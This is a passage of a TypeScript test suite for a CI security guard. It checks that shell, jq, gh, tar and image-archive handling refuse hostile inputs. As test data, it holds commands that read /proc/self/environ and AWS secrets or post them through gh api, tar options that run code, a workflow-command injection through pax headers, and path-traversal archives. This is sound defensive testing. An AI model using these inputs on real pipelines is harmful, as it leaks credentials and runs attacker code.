      [`echo "\${a[$i]}"`, 1],
      ['echo $(( $(jq length <<<"$x") ))', 1],
      ['[[ "$x" -gt 1 ]]', 1],
      [`echo "\${x@P}"`, 1],
      [`echo "\${!x}"`, 1],
      [`echo "\${x:$y}"`, 1],
      ['a=([$y]=1)', 1],
      ['x=1\necho $(( x + $1 ))', 2],
      // The seventh review's first attack: a name read, unset or wait -p is handed evaluates its subscript, a
      // ${a[…]} evaluates its subscript whatever follows it, and a [[ … ]] reads to the ]] that stands as a
      // word, so a ]] inside one hides nothing, nor does a line break.
      ['x=$(jq -r .n f.json)\nread -r "a[$x]" <<<1', 2],
      ["x=$(jq -r .n f.json)\nread -r 'a[$x]' <<<1", 2],
      ['x=$(jq -r .n f.json)\nread -r "$x" <<<1', 2],
      ['x=$(jq -r .n f.json)\nunset "a[$x]"', 2],
      ['x=$(jq -r .n f.json)\nunset -v "a[$x]"', 2],
      ['x=$(jq -r .n f.json)\n{ unset "a[$x]"; }', 2],
      ['x=$(jq -r .n f.json)\nbuiltin read -r "a[$x]" <<<1', 2],
      ['x=$(jq -r .n f.json)\nwait -n -p "a[$x]"', 2],
      ['mapfile -t -C "$x" lines <<<1', 1],
      [`x=$(jq -r .n f.json)\necho "\${a[$x]:-}"`, 2],
      [`x=$(jq -r .n f.json)\necho "\${a[$x]+set}" "\${a[$x]/b/c}"`, 2],
      [`x=$1\n[[ "\${x//[[:space:]]/}" -gt 1 ]]`, 2],
      ['x=$1\n[[ "$x" =~ ^[[:alnum:]]+$ || "$x" -gt 1 ]]', 2],
      ['x=$1\n[[ -n "$x" &&\n"$x" -gt 1 ]]', 2],
      ['x=$1\n[[ ( "$x" -gt 1 ) ]]', 2],
      ['x=$1\n[ "-v" "$x" ]', 2],
      ['x=$1\nop=$2\n[ "$op" "$x" ]', 3],
      ['x=$1\n[ -n "$x" ] && [ "$x" = a -o -v "$x" ]', 2],
      ['x=$1\ntest -v "$x"', 2],
      ['x=$1\nRANDOM=$x', 2],
      ['x=$1\nread -r OPTIND <<<"$x"', 2],
      ['PS4=$1\nset -x', 1],
      // The seventh review's second attack: a default assignment sets a name no assignment of it shows, an
      // element's assignment sets the name ($n reads n[0]), and a descriptor's variable is named by a
      // redirection whose subscript bash evaluates.
      [`f() {\n  local n=\n  : "\${n:=$1}"\n  (( n > 1 ))\n}`, 3],
      [`f() {\n  local n=\n  : \${n=$1}\n  (( n > 1 ))\n}`, 3],
      [`f() {\n  local n=\n  : "\${n[0]:=$1}"\n}`, 3],
      ['f() {\n  local n=0\n  n[0]=$1\n  (( n > 1 ))\n}', 4],
      ['f() {\n  local n=0\n  n[0]+=$1\n  (( n > 1 ))\n}', 4],
      ['x=$(jq -r .n f.json)\necho hi {a[$x]}>/dev/null', 2],
      ['exec {fd}>/dev/null', 1],
    ] as const) {
      expect(canonicalTextFindings({ X: text }), text).toContain(evaluates('X', line))
    }
    // (Off a canonical text's own lines, any evaluation is also no shape readsAsBash() reads, so these are
    // asked of outsideEvaluations() alone.)
    for (const text of [
      'n=0\nn=$((n + 1))',
      `echo "\${a[0]}"`,
      // (Its name evaluates nothing from outside; a name built so is canonicalToolLines()' to refuse.)
      `for kind in a b; do printf -v "\${kind^^}_X" %s 1; done`,
      'while IFS= read -r name; do :; done <<<"$x"',
      `IFS=$'\\t' read -r path key <<<"$x"`,
      `mapfile -t TASK_ARNS < <(jq -r '.[]' <<<"$x")`,
      'run aws ecs wait tasks-stopped --cluster "$CLUSTER" --tasks "$task"',
      '[ "$x" = "$y" ] && [ -n "$x" ] && ! [ "$(wc -l <<<"$x")" -gt 0 ]',
      '[[ "$x" =~ ^[0-9]+$ ]] || [[ "$x" != *_IN_PROGRESS ]]',
    ]) {
      expect(outsideEvaluations(text), text).toEqual([])
    }
    expect(canonicalTextFindings({ X: 'echo `true`' })).toEqual([
      `${GUARD}: DPW-10 X: is written in the shell shellViews() reads`,
    ])
    // ONE_OFF's count of withheld lines once took jq's count of the log into arithmetic.
    const withheld = /^ *withheld=.*$/m.exec(ONE_OFF)?.[0] ?? ''
    expect(withheld).toContain('jq --argjson shown')
    const before = withheld.replace(
      /withheld=.*/,
      () => `withheld=$(($(jq length <<<"$log") - $(printf '%s' "$shown" | grep -c '^' || true)))`,
    )
    const line = ONE_OFF.split('\n').indexOf(withheld) + 1
    expect(canonicalTextFindings({ ONE_OFF: ONE_OFF.replace(withheld, () => before) })).toContain(
      evaluates('ONE_OFF', line),
    )
    // Each closes all it opens: bash parses it alone, and its last line continues nothing.
    for (const [name, text] of Object.entries(CANONICAL_BY_NAME())) {
      const parsed = spawnSync('bash', ['-n'], { input: text, encoding: 'utf8' })
      expect([parsed.status, parsed.stderr], name).toEqual([0, ''])
      expect(text, name).not.toMatch(/(?:\\|&&|\|\||\|)\s*$/)
    }
  })

  // The seventh review's first attack: a canonical text's jq once took its program from a repository file
  // (-f), its image unpacking a tar that ran each member (--to-command), and its mask a sed that ran a line it
  // read (e), each admitted because the tool's hold read the line it held out of the canonical text itself.
  // Every such line is now written in the guard (TOOL_LINE_TEXTS), standing whole in its text, and a
  // canonical text's jq and gh are held to their flags and a program written on the line.
  it("holds a canonical text's jq, gh and line-held tools to what the guard writes", () => {
    for (const [line, text] of TOOL_LINE_TEXTS()) {
      expect(
        text.split('\n').some(each => each.trim() === line),
        line,
      ).toBe(true)
    }
    for (const text of Object.values(CANONICAL_BY_NAME())) expect(canonicalToolLines(text)).toEqual([])
    for (const [text, line] of [
      ['x=$(jq -er --arg key "$1" -f infra/checks/stack-output.jq <<<"$o")', 0],
      ['x=$(jq -r --from-file p.jq "$f")', 0],
      ["x=$(jq -n --rawfile e /proc/self/environ '$e')", 0],
      ['x=$(jq -n --slurpfile e "$f" \'$e\')', 0],
      ['x=$(jq -L lib -n \'include "x"; .\')', 0],
      ['x=$(jq -r \'P\' "-f" lib.jq)', 0],
      ['x=$(jq -r \'.a\' "$f" --rawfile e /proc/self/environ)', 0],
      ['x=$(jq -r "$program" "$f")', 0],
      ["x=$(jq -r '.a' \"$f\")\ny=$(jq -nr 'env.AWS_SECRET_ACCESS_KEY')", 1],
      ["x=$(jq -nr '$ENV.HOME')", 0],
      ['x=$(jq -r \'input_filename\' "$f")', 0],
      ['x=$(gh api "repos/$REPO/issues" --input /proc/self/environ)', 0],
      ['x=$(gh api "repos/$REPO/issues" -F "body=@/proc/self/environ")', 0],
      ['x=$(gh api "repos/$REPO/runs" --jq \'env\')', 0],
      // The seventh review's second attack: a flag jq receives as one, though written quoted or escaped, in
      // its program's place or after it, and a word an expansion starts that no / follows.
      [`x=$(jq -er --arg key "$1" '-f' infra/checks/x.jq <<<"$o")`, 0],
      [`x=$(jq -er --arg key "$1" '--from-file' infra/checks/x.jq <<<"$o")`, 0],
      [`x=$(jq -er '-L' infra/checks 'include "x"; f' <<<"$o")`, 0],
      [`x=$(jq -er 'infra/checks/x.jq' \\-f <<<"$o")`, 0],
      [`x=$(jq -er '.a' "-f" x <<<"$o")`, 0],
      [`x=$(jq -er '.a' -\\f x <<<"$o")`, 0],
      [`x=$(jq -er '.a' "$o"rawfile e /proc/self/environ)`, 0],
      [`x=$(gh api "repos/$REPO/x" --jq '-x')`, 0],
      // printf's -v joined to its name, quoted or escaped, and a format an expansion gives, each of which bash
      // reads as -v and a name whose subscript it evaluates.
      ['printf -v"a[$x]" %s 1', 0],
      ['printf -va[$x] %s 1', 0],
      [`printf "-v" "a[$x]" '%s' 1`, 0],
      [`printf \\-v "a[$x]" '%s' 1`, 0],
      ['printf "$f" a', 0],
      [`printf '-v' "a[$x]" '%s' 1`, 0],
      ['tar --extract --file "$1" --to-command=\'. /dev/stdin\'', 0],
      ['tar --extract --file "$1" --directory "$2" --checkpoint=1 --checkpoint-action=exec=x', 0],
      ['mkdir -p "$HOME/.local/bin"', 0],
      [`entries=$(find "$2" -mindepth 1 -exec cp {} "$HOME/.jq" \\;)`, 0],
      [
        PREAMBLE.replace("ta'; }", "ta; /^: hearth;/e'; }"),
        PREAMBLE.split('\n').findIndex(each => each.startsWith('mask()')),
      ],
    ] as const) {
      expect(canonicalToolLines(text), text).toContain(line)
    }
    // A changed tool line is a finding of the canonical rule, whatever the line in the guard says.
    const planted = {
      IMAGE_CHECK: IMAGE_CHECK.replace(
        '  mkdir "$2"\n',
        '  mkdir "$2"\n  tar --extract --file "$1" --to-command=cat\n',
      ),
    }
    expect(planted.IMAGE_CHECK).not.toBe(IMAGE_CHECK)
    expect(canonicalTextFindings(planted).join('\n')).toMatch(/DPW-10 IMAGE_CHECK, line \d+: hands jq and gh only/)
  })

  // jq -e takes its status from the program's last value alone, so a check over every entry written X[] | f
  // (jq's usual way to check each, reading in a diff as all(X[]; f)) passes whenever X's last entry passes; with
  // ASSET_CHECK's file-asset rule written so, an executable on Platform's zip, the first of its two file assets,
  // passed, and the CLI would run it with the deploy role's credentials.
  it('hands jq -e only a program that prints one value', () => {
    for (const program of [
      'all(.[]; . > 0)',
      '(.files // {}) | all(.[]; .source | type == "object")',
      '[.[] | select(.a)] | length == 0',
      '.a | select(test("x"))',
      'first(.[] | select(.k == 1)) | .v',
      '{a: 1, "b": [2, 3]} == .',
      '.x as [$a, $b] | $a == $b',
      'def g: .[0]; g == 1',
      'def of($t): .[] | select(.T == $t); all(of("x"); . != null)',
      'def leaf: if type == "object" then length == 0 else true end; leaf',
      '"\\(.a)-\\(.b)" | test("-")',
      '.["k"] | type == "string"',
      '$r[.].T == "x" and $r[.x] != null',
      'if .a then [.b[]] else [] end | length == 0',
      'any(.[]?; test("^sha-"))',
      'map(.x) | sort == ["a", "b"]',
      'capture("(?<s>x)").s == "x"',
      '.',
      'type == "object" and keys == ["Ref"]',
    ]) {
      expect(jqPrintsOne(program), program).toBe(true)
    }
    for (const program of [
      '.[] | . > 0',
      '(.files // {})[] | .source | type == "object"',
      '.a[]? | . == 1',
      '$r[] | .T == "x"',
      '.. | numbers',
      '.a, .b',
      '.[1, 2] == 1',
      '(.[] | . > 0) and true',
      '(.[] | . > 0) as $x | $x',
      'select(.[] == 1) | true',
      'def of: .[]; of | . > 0',
      'def length: .[]; length > 0',
      'def all(f): f; all(.[] | . > 0)',
      'def a: b; def b: a; a',
      'capture("x"; "g") | .a',
      // capture's one argument may be an array of a pattern and its flags, which jq reads as the two-argument
      // form: with "g", a value a match. So its argument is one plain string literal, never an expression.
      'capture(["x", "g"]) | .a',
      '["x", "g"] as $v | capture($v) | .a',
      'capture(.p) | .a',
      'capture("\\(.p)") | .a',
      'range(3) | . > 0',
      'recurse | . == 1',
      'limit(2; .[]) | . > 0',
      'reduce .[] as $x (0; . + $x) > 0',
      '"\\(.[])" | test("x")',
      '{a: .[]} | .a > 0',
      'if .[] then true else false end',
      '# a comment\ntrue',
      '.a // .b[]',
      '. as [$a] ?// $a | $a',
      '.[] | first',
      '(.a',
      '"unclosed',
      'def f: .a',
      'env | length > 0',
      'to_entries[] | .value == 1',
    ]) {
      expect(jqPrintsOne(program), program).toBe(false)
    }
    // ASSET_CHECK's file-asset rule and AWS_CHECK's count, each rewritten so, are refused by DPW-10 on their line.
    const rule = `jq -e '(.files // {}) | all(.[]; (.source | type == "object")`
    const start = ASSET_CHECK.indexOf(rule)
    const end = ASSET_CHECK.indexOf(`' "$dir/$file"`, start)
    expect(start).toBeGreaterThan(-1)
    const body = ASSET_CHECK.slice(start + rule.length - '(.source | type == "object")'.length, end - 1)
    const rewritten = `${ASSET_CHECK.slice(0, start)}jq -e '(.files // {})[] | ${body}${ASSET_CHECK.slice(end)}`
    const line = rewritten.slice(0, start).split('\n').length
    expect(canonicalTextFindings({ ASSET_CHECK: rewritten })).toContain(
      `${GUARD}: DPW-10 ASSET_CHECK, line ${line}: hands jq -e only a program that prints one value, since -e reads the last alone: outside all, any, first, map and an array it builds, no .[], .., comma, ?// or name but JQ_ONE_NAMES and its own definitions that hold to the same`,
    )
    const counts = AWS_CHECK.replace(`jq -e 'all(.counts[]; . == 1)'`, `jq -e '.counts[] | . == 1'`)
    expect(counts).not.toBe(AWS_CHECK)
    expect(canonicalTextFindings({ AWS_CHECK: counts }).join('\n')).toMatch(
      /DPW-10 AWS_CHECK, line \d+: hands jq -e only a program that prints one value/,
    )
    // -e among other flags, and -r alone (whose value a test then reads), as written.
    expect(canonicalTextFindings({ X: `x=$(jq -se '.[] | . > 0' "$dir/$file")` }).join('\n')).toMatch(
      /DPW-10 X, line 1: hands jq -e only/,
    )
    expect(canonicalTextFindings({ X: `x=$(jq -r '.[]' "$dir/$file")` }).join('\n')).not.toMatch(/hands jq -e only/)
    // A run's own line, as the glue reads it, is held the same way.
    expect(
      credentialedCodeFindings(
        addedBefore(
          'nonprod',
          'Read back what runs',
          "          SERVICE_LIST='[]'\n",
          `          jq -e '.[] | . == 1' <<<"$SERVICE_LIST" >/dev/null\n`,
        ),
        manifests,
        lockfile,
      ).join('\n'),
    ).toMatch(/DPW-10 nonprod \(Read back what runs\)/)
    expect(
      credentialedCodeFindings(
        addedBefore(
          'nonprod',
          'Read back what runs',
          "          SERVICE_LIST='[]'\n",
          `          jq -e 'all(.[]; . == 1)' <<<"$SERVICE_LIST" >/dev/null\n`,
        ),
        manifests,
        lockfile,
      ).join('\n'),
    ).not.toMatch(/DPW-10 nonprod \(Read back what runs\)/)
  })

  it('holds the repository', () => {
    expect(credentialedCodeFindings(workflows, manifests, lockfile)).toEqual([])
    // The globs are folders or a folder's children, which the pattern reads exactly.
    expect(
      Array.isArray(workspaceGlobs) &&
        workspaceGlobs.every(glob => /^[\w.-]+(?:\/[\w.-]+)*(?:\/\*)?$/.test(String(glob))),
    ).toBe(true)
    expect([...manifests.keys()]).toEqual(
      expect.arrayContaining(['package.json', 'infra/package.json', 'apps/server/package.json', 'demo/package.json']),
    )
  })
})

// CLI_FETCH and CLI_CHECK (C11-D48, C11-D76; round 4's ACTIONS-01 and SECURITY-01), each run as written with
// bash, jq, openssl and tar against a stand-in curl that serves a planted tarball, in a scratch checkout with
// its own infra/package.json and lockfile: the CLI is the tarball whose sha512 is the lockfile's integrity,
// fetched by its fixed URL and unpacked into a folder of its own, and no npm runs, so neither an .npmrc nor a
// git dependency in the lockfile can run code where the OIDC request token is.
describe('DPW-10 (C11-D48, C11-D76): CLI_FETCH and CLI_CHECK against a planted tarball', () => {
  let scratch = ''
  const PIN = '9.9.9'
  const URL = `https://registry.npmjs.org/aws-cdk/-/aws-cdk-${PIN}.tgz`
  beforeAll(() => {
    scratch = mkdtempSync(join(tmpdir(), 'hearth-dpw10-cli-'))
  })
  afterAll(() => {
    if (scratch !== '') rmSync(scratch, { recursive: true, force: true })
  })
  // A tarball of package/ holding the given manifest, a bin/cdk and, if asked, a link; its sha512 integrity.
  let tarballs = 0
  function tarball(manifest: Record<string, unknown>, link = false): { path: string; integrity: string } {
    const folder = join(scratch, `tarball-${++tarballs}`)
    execFileSync('mkdir', ['-p', join(folder, 'package', 'bin')])
    writeFileSync(join(folder, 'package', 'package.json'), JSON.stringify(manifest))
    writeFileSync(join(folder, 'package', 'bin', 'cdk'), '#!/bin/sh\necho cdk\n', { mode: 0o755 })
    if (link) symlinkSync('/bin/sh', join(folder, 'package', 'bin', 'sh'))
    const path = join(scratch, `aws-cdk-${tarballs}.tgz`)
    execFileSync('tar', ['-czf', path, '-C', folder, 'package'])
    const integrity = `sha512-${createHash('sha512').update(readFileSync(path)).digest('base64')}`
    return { path, integrity }
  }
  const CLI = { name: 'aws-cdk', version: PIN, bin: { cdk: 'bin/cdk' } }
  interface Plant {
    served: string
    entry?: Record<string, unknown>
    pin?: string
    // The folder the CLI is unpacked into, made beforehand.
    made?: boolean
  }
  // The checkout, the runner's temp folder and a stand-in curl that logs its arguments and serves the
  // planted tarball to its --output; npm on PATH would leave a mark, as would a git program an .npmrc names.
  function fetched(plant: Plant): { status: number | null; said: string; curl: string[]; npm: boolean; cdk: boolean } {
    const run = mkdtempSync(join(scratch, 'run-'))
    const repo = join(run, 'repo')
    const temp = join(run, 'temp')
    const bin = join(run, 'bin')
    execFileSync('mkdir', ['-p', join(repo, 'infra'), temp, bin])
    writeFileSync(
      join(repo, 'infra', 'package.json'),
      JSON.stringify({ devDependencies: { 'aws-cdk': plant.pin ?? PIN } }),
    )
    const entry = plant.entry ?? { version: PIN, resolved: URL, integrity: '' }
    writeFileSync(join(repo, 'package-lock.json'), JSON.stringify({ packages: { 'node_modules/aws-cdk': entry } }))
    writeFileSync(join(repo, '.npmrc'), `git=${join(bin, 'git-mark')}\n`)
    const mark = join(run, 'npm-ran')
    for (const name of ['npm', 'git-mark']) {
      writeFileSync(join(bin, name), `#!/bin/sh\ntouch '${mark}'\n`, { mode: 0o755 })
    }
    if (plant.made) execFileSync('mkdir', [join(temp, 'aws-cdk')])
    const log = join(run, 'curl.log')
    writeFileSync(log, '')
    const STUB = `curl() {
  local out='' previous=''
  printf '%s\\n' "$@" >>"$CURL_LOG"
  for word in "$@"; do
    if [ "$previous" = --output ]; then out=$word; fi
    previous=$word
  done
  cp "$SERVED" "$out"
}`
    const result = spawnSync('bash', ['-c', `${STUB}\n${CLI_FETCH}\n${CLI_CHECK}`], {
      cwd: repo,
      encoding: 'utf8',
      env: {
        PATH: `${bin}:${process.env.PATH ?? ''}`,
        HOME: run,
        RUNNER_TEMP: temp,
        CURL_LOG: log,
        SERVED: plant.served,
      },
    })
    let cdk = false
    try {
      cdk = readFileSync(join(temp, 'aws-cdk', 'package', 'bin', 'cdk'), 'utf8').startsWith('#!/bin/sh')
    } catch {
      cdk = false
    }
    let npm = true
    try {
      readFileSync(mark)
    } catch {
      npm = false
    }
    return {
      status: result.status,
      said: spoken(result.stdout).at(-1) ?? '',
      curl: readFileSync(log, 'utf8').split('\n').filter(Boolean),
      npm,
      cdk,
    }
  }
  const lockOf = (integrity: string, more: Record<string, unknown> = {}) => ({
    version: PIN,
    resolved: URL,
    integrity,
    ...more,
  })

  it('fetches the registry tarball by its fixed URL, checks its sha512 and unpacks it, and runs no npm', () => {
    const good = tarball(CLI)
    const done = fetched({ served: good.path, entry: lockOf(good.integrity) })
    expect(done).toEqual({ status: 0, said: '', curl: done.curl, npm: false, cdk: true })
    const temp = done.curl[done.curl.indexOf('--output') + 1] ?? ''
    expect(done.curl).toEqual([
      '-q',
      '--fail',
      '--silent',
      '--show-error',
      '--proto',
      '=https',
      '--tlsv1.2',
      '--max-time',
      '300',
      '--max-filesize',
      '104857600',
      '--output',
      temp,
      URL,
    ])
    expect(temp.endsWith('/temp/aws-cdk/aws-cdk.tgz')).toBe(true)
  })

  it('refuses a tarball whose sha512 isn’t the lockfile’s integrity, and unpacks nothing', () => {
    const good = tarball(CLI)
    const other = tarball({ ...CLI, description: 'another' })
    const refused = fetched({ served: other.path, entry: lockOf(good.integrity) })
    expect(refused).toMatchObject({ status: 1, cdk: false, npm: false })
    expect(refused.said).toBe("cli-fetch: the tarball's sha512 isn't the lockfile's integrity")
  })

  it('refuses a lockfile entry that isn’t the registry’s tarball at the pin, and a pin that isn’t one version, before fetching', () => {
    const good = tarball(CLI)
    const LOCK = "cli-fetch: the lockfile's aws-cdk isn't the registry's tarball at infra's pin"
    for (const entry of [
      lockOf(good.integrity, { resolved: 'git+ssh://git@github.com/aws/aws-cdk-cli.git#0123456' }),
      lockOf(good.integrity, { resolved: 'https://registry.npmjs.org/aws-cdk/-/aws-cdk-0.0.1.tgz' }),
      lockOf(good.integrity, { link: true }),
      lockOf(good.integrity, { version: '0.0.1' }),
      lockOf(good.integrity.replace('sha512-', 'sha1-')),
      lockOf(`${good.integrity}\n`),
    ]) {
      const refused = fetched({ served: good.path, entry })
      expect(refused, JSON.stringify(entry)).toMatchObject({ status: 1, said: LOCK, curl: [], npm: false, cdk: false })
    }
    const unpinned = fetched({ served: good.path, entry: lockOf(good.integrity), pin: '^9.9.9' })
    expect(unpinned).toMatchObject({
      status: 1,
      said: "cli-fetch: infra's aws-cdk isn't pinned to one version",
      curl: [],
    })
    // A folder already there for the CLI is never written into.
    expect(fetched({ served: good.path, entry: lockOf(good.integrity), made: true })).toMatchObject({
      status: 1,
      curl: [],
      cdk: false,
    })
  })

  it('CLI_CHECK refuses an unpacked CLI that holds a link, or whose manifest isn’t aws-cdk at the pin alone', () => {
    const linked = tarball(CLI, true)
    expect(fetched({ served: linked.path, entry: lockOf(linked.integrity) })).toMatchObject({
      status: 1,
      said: 'cli-check: the unpacked CLI holds a symbolic link',
    })
    const PACKAGE = "cli-check: the unpacked aws-cdk isn't the registry's package at infra's pin"
    for (const manifest of [
      { ...CLI, name: 'not-aws-cdk' },
      { ...CLI, version: '0.0.1' },
      { ...CLI, bin: { cdk: 'bin/other' } },
      { ...CLI, dependencies: { other: '1.0.0' } },
    ]) {
      const planted = tarball(manifest)
      expect(
        fetched({ served: planted.path, entry: lockOf(planted.integrity) }),
        JSON.stringify(manifest),
      ).toMatchObject({ status: 1, said: PACKAGE })
    }
  })
})

describe('DPW-13 (C11-D50, C11-D79): IMAGE_CHECK against planted image archives', () => {
  let scratch = ''
  beforeAll(() => {
    scratch = mkdtempSync(join(tmpdir(), 'hearth-dpw13-image-'))
  })
  afterAll(() => {
    if (scratch !== '') rmSync(scratch, { recursive: true, force: true })
  })
  const BLOB = 'a'.repeat(64)
  const MANIFEST = 'b'.repeat(64)
  // A folder holding the layout buildx's OCI export writes: oci-layout, index.json and two blobs.
  let folders = 0
  function layout(): string {
    const folder = join(scratch, `layout-${++folders}`)
    execFileSync('mkdir', ['-p', join(folder, 'blobs', 'sha256')])
    writeFileSync(join(folder, 'oci-layout'), '{"imageLayoutVersion":"1.0.0"}')
    writeFileSync(join(folder, 'index.json'), `{"schemaVersion":2,"manifests":[{"digest":"sha256:${MANIFEST}"}]}`)
    writeFileSync(join(folder, 'blobs', 'sha256', BLOB), 'layer')
    writeFileSync(join(folder, 'blobs', 'sha256', MANIFEST), 'manifest')
    return folder
  }
  // An archive of a layout, its members in buildx's order (the folders first) and any more given after them,
  // made by GNU tar in one go (so a hard link is written as one), or, with extra arguments (-P, a
  // --transform), those members appended with them alone.
  function archive(folder: string, more: readonly string[] = [], options: readonly string[] = []): string {
    const path = join(scratch, `image-${folders}-${more.length}-${options.length}.tar`)
    const members = ['blobs/', 'blobs/sha256/', `blobs/sha256/${BLOB}`, `blobs/sha256/${MANIFEST}`, 'index.json']
    const tar = ['--numeric-owner', '--no-recursion', '-C', folder]
    if (options.length === 0) execFileSync('tar', [...tar, '-cf', path, ...members, 'oci-layout', ...more])
    else {
      execFileSync('tar', [...tar, '-cf', path, ...members, 'oci-layout'])
      execFileSync('tar', [...tar, ...options, '-rf', path, ...more])
    }
    return path
  }
  // The deploy jobs' step, as it runs: the archive at the runner's image folder, then the check and the
  // unpacking into the folder the push copies from. The last line it said, and what the folder holds.
  function checked(path: string, script = `${IMAGE_UNPACK_RUN}\n`) {
    const temp = mkdtempSync(join(scratch, 'runner-'))
    execFileSync('mkdir', [join(temp, 'image')])
    cpSync(path, join(temp, 'image', 'image.tar'))
    const result = spawnSync('bash', ['-c', script], {
      encoding: 'utf8',
      env: { PATH: process.env.PATH ?? '', HOME: temp, RUNNER_TEMP: temp },
    })
    let unpacked: string[] = []
    try {
      unpacked = (readdirSync(join(temp, 'image-layout'), { recursive: true }) as string[]).sort()
    } catch {
      unpacked = []
    }
    return { status: result.status, said: spoken(result.stdout).at(-1) ?? '', unpacked }
  }
  const MEMBER = "image-check: the image's archive holds a member buildx's OCI export never writes"
  const FOLDER = "image-check: the unpacked image holds a link or a file buildx's OCI export never writes"

  it('unpacks the archive buildx writes into the folder the push copies from, and the build’s check passes it', () => {
    const done = checked(archive(layout()))
    expect(done).toEqual({
      status: 0,
      said: '',
      unpacked: [
        'blobs',
        'blobs/sha256',
        `blobs/sha256/${BLOB}`,
        `blobs/sha256/${MANIFEST}`,
        'index.json',
        'oci-layout',
      ],
    })
    // The push copies from that folder, never the archive (SECURITY-01, round 5).
    expect(SKOPEO_COPY).toContain(`"oci:${IMAGE_LAYOUT}:build"`)
    expect(IMAGE_UNPACK_RUN).toContain(`unpack_image "$RUNNER_TEMP/image/image.tar" "${IMAGE_LAYOUT}"`)
    // The build's own run checks the archive buildx wrote, before its outputs.
    const build = PINNED_RUNS().build?.['Build the image']?.run ?? ''
    expect(build).toContain(`${IMAGE_CHECK}\ncheck_image_archive "$RUNNER_TEMP/image.tar"\necho "digest=`)
    const buildRun = checked(
      archive(layout()),
      `set -euo pipefail\n${IMAGE_CHECK}\ncheck_image_archive "$RUNNER_TEMP/image/image.tar"\n`,
    )
    expect(buildRun).toMatchObject({ status: 0, said: '' })
  })

  // EXPAND-A1-01 (round 6). GNU tar names a pax header keyword it doesn't know on stderr as it is, line
  // breaks and all, and still exits 0, and pax headers are no members, so the listing and the folder pass.
  // The build runs repository code before it uploads the archive, so the archive could end a line with
  // ##[add-mask] and a value of its choosing, which the runner would hide in every later line and summary
  // and in any job output it matches (services_started, and with it the pipeline's rollback). The run stops
  // the runner reading workflow commands before tar reads anything: the stop line is the first it prints.
  it('stops the runner reading workflow commands before tar names the archive’s pax headers (EXPAND-A1-01, round 6)', () => {
    const folder = layout()
    const path = join(scratch, 'image-pax.tar')
    execFileSync('tar', [
      '--numeric-owner',
      '--no-recursion',
      '-C',
      folder,
      '--format=posix',
      '--pax-option=##[add-mask]true\nhearth:=x',
      '-cf',
      path,
      'blobs/',
      'blobs/sha256/',
      `blobs/sha256/${BLOB}`,
      `blobs/sha256/${MANIFEST}`,
      'index.json',
      'oci-layout',
    ])
    const temp = mkdtempSync(join(scratch, 'runner-'))
    execFileSync('mkdir', [join(temp, 'image')])
    cpSync(path, join(temp, 'image', 'image.tar'))
    // Both streams in the order the run wrote them, as the runner reads both.
    const result = spawnSync('bash', ['-c', `exec 2>&1\n${IMAGE_UNPACK_RUN}\n`], {
      encoding: 'utf8',
      env: { PATH: process.env.PATH ?? '', HOME: temp, RUNNER_TEMP: temp },
    })
    expect(result.status).toBe(0)
    const lines = result.stdout.split('\n')
    expect(lines.some(line => line.endsWith('##[add-mask]true'))).toBe(true)
    expect(lines[0]).toMatch(STOP_LINE)
    expect(readdirSync(join(temp, 'image-layout'), { recursive: true }).length).toBe(6)
  })

  it('refuses a link written through, a link or hard link, an absolute, escaped or other name, a fifo or a folder, before unpacking anything (SECURITY-01, round 5)', () => {
    // A symbolic link to a folder outside, then a file through it: what skopeo's oci-archive source would
    // write over the CLI.
    const outside = mkdtempSync(join(scratch, 'outside-'))
    const through = layout()
    symlinkSync(outside, join(through, 'zz'))
    writeFileSync(join(outside, 'index.js'), 'not the CLI')
    const throughArchive = archive(through, ['zz', 'zz/index.js'])
    rmSync(join(outside, 'index.js'))
    expect(checked(throughArchive)).toEqual({ status: 1, said: MEMBER, unpacked: [] })
    expect(readdirSync(outside)).toEqual([])
    // A symbolic link under an allowed name.
    const named = layout()
    rmSync(join(named, 'index.json'))
    symlinkSync('/etc/hostname', join(named, 'index.json'))
    expect(checked(archive(named))).toEqual({ status: 1, said: MEMBER, unpacked: [] })
    // A hard link, an extra member, a fifo and a folder under a file's name.
    const hard = layout()
    execFileSync('ln', [join(hard, 'oci-layout'), join(hard, 'blobs', 'sha256', 'c'.repeat(64))])
    expect(checked(archive(hard, [`blobs/sha256/${'c'.repeat(64)}`]))).toEqual({
      status: 1,
      said: MEMBER,
      unpacked: [],
    })
    const extra = layout()
    writeFileSync(join(extra, 'manifest.json'), '[]')
    expect(checked(archive(extra, ['manifest.json']))).toEqual({ status: 1, said: MEMBER, unpacked: [] })
    const fifo = layout()
    execFileSync('mkfifo', [join(fifo, 'blobs', 'sha256', 'pipe')])
    expect(checked(archive(fifo, ['blobs/sha256/pipe']))).toEqual({ status: 1, said: MEMBER, unpacked: [] })
    const folder = layout()
    execFileSync('mkdir', [join(folder, 'blobs', 'sha256', 'd'.repeat(64))])
    expect(checked(archive(folder, [`blobs/sha256/${'d'.repeat(64)}`]))).toEqual({
      status: 1,
      said: MEMBER,
      unpacked: [],
    })
    // An absolute name, a name with .., and a name holding a line break.
    const absolute = layout()
    expect(
      checked(archive(absolute, ['index.json'], ['-P', `--transform=s,^,${join(scratch, 'absolute')}/,`])),
    ).toEqual({ status: 1, said: MEMBER, unpacked: [] })
    expect(checked(archive(layout(), ['index.json'], ['-P', '--transform=s,^,../,']))).toEqual({
      status: 1,
      said: MEMBER,
      unpacked: [],
    })
    const broken = layout()
    writeFileSync(join(broken, 'x\nindex.json'), '')
    expect(checked(archive(broken, ['x\nindex.json']))).toEqual({ status: 1, said: MEMBER, unpacked: [] })
    // No archive at all, and a folder already there for the layout.
    const junk = join(scratch, 'junk.tar')
    writeFileSync(junk, 'not a tar\n')
    expect(checked(junk)).toEqual({ status: 1, said: "image-check: the image's archive can't be read", unpacked: [] })
    expect(checked(archive(layout()), `mkdir "$RUNNER_TEMP/image-layout"\n${IMAGE_UNPACK_RUN}\n`).status).not.toBe(0)
  })

  // GNU tar, handed an archive by name, runs the decompressor its first bytes name (gzip, bzip2, xz) over the
  // build's bytes with the step's environment, and the listing of buildx's own members then passes. The check
  // hands tar the archive on its standard input, where tar refuses a compressed one and runs nothing: a
  // stand-in for each decompressor first on PATH notes any run.
  it('refuses a compressed archive of buildx’s own members and runs no decompressor', () => {
    const plain = archive(layout())
    const stand = mkdtempSync(join(scratch, 'stand-'))
    const ran = join(stand, 'ran')
    for (const tool of ['gzip', 'bzip2', 'xz', 'zstd', 'lzip', 'lzop', 'compress']) {
      writeFileSync(join(stand, tool), `#!/bin/sh\necho ${tool} >>'${ran}'\nexit 1\n`, { mode: 0o755 })
    }
    for (const [name, compress] of [
      ['gzip', ['gzip']],
      ['bzip2', ['bzip2']],
      ['xz', ['xz']],
